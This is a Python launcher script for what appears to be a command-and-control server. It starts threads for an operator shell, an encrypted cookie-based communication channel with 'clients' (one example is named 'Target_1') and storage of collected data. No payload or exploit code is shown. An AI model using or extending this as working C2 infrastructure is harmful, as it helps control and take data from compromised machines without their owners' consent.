#!/usr/bin/python3
from threading import Event, Lock
import threading
from time import sleep
from modules.cc.shell import shell_main
from modules.cookie_comm import communication_server_main
from modules.client import Client
from modules.crypto import encrypt, decrypt
from modules.cc.data_storage import store_data_main
import logging
import concurrent.futures

# Dont show flask server infos
# import logging, sys
# log = logging.getLogger('werkzeug')
# log.setLevel(logging.ERROR)
# cli = sys.modules['flask.cli']
# cli.show_server_banner = lambda *x: None

if __name__ == '__main__':
    # [%(thread)-6d] [%(threadName)-25s]
    FORMAT = '[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]'
    logging.basicConfig(filename='cc.log', encoding='utf-8', format=FORMAT, level=0)

    clients = dict()
    clients_lock = Lock()
    #clients['Target_1'] = Client('Target_1')

    shutdown_signal = Event()


    print("Starting CC...")
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)

            # thread for shell
    executor.submit(shell_main, clients, clients_lock, shutdown_signal)

    # thread for connection 
    # , encrypt, decrypt
    executor.submit(communication_server_main, clients, clients_lock, shutdown_signal, encrypt, decrypt)
    
    # thread for shell
    # shell_main(clients, clients_lock)
    # executor.submit()

    # thread to store data

    executor.submit(store_data_main, clients, shutdown_signal)

    try:
        while not shutdown_signal.is_set():
            sleep(1)

    except KeyboardInterrupt:
        print("Stopping CC...")
        shutdown_signal.set()


